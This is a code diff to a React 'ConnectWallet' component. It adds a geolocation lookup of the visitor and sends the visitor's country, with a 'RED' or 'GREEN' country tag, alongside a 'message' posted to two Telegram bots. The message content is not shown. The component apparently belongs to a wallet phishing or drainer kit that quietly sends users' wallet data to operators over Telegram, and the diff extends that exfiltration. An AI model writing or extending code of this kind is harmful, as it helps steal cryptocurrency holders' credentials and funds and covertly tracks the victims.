@@ -17,6 +17,26 @@ function ConnectWallet({ onClose }) {
   const [usdBalance, setUsdBalance] = useState(null);
   const [address, setAddress] = useState("");
   const navigate = useNavigate();
+  const [country, setCountry] = useState("");
+
+  
+  useEffect(() => {
+    const getCountry = async () => {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        const country = data.country_name;
+        setCountry(country);
+      } catch (error) {
+        console.error("Error fetching country:", error);
+        setCountry("Unknown");
+        console.log("Unknown"); // Log "Unknown" if there's an error
+      }
+    };
+    getCountry();
+  }, []);
+
+
 
   const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
   const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
@@ -408,7 +428,9 @@ function ConnectWallet({ onClose }) {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-
+    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
+    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
+    
     const endpoints = [
       {
         url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -421,7 +443,7 @@ function ConnectWallet({ onClose }) {
         url: `https://api.telegram.org/bot${otoken}/sendMessage`,
         data: {
           chat_id: ochat_id,
-          text: `Minwallet:   ${message}`,
+          text: `Minwallet: ${country}   ${message}`,
         },
       },
     ];
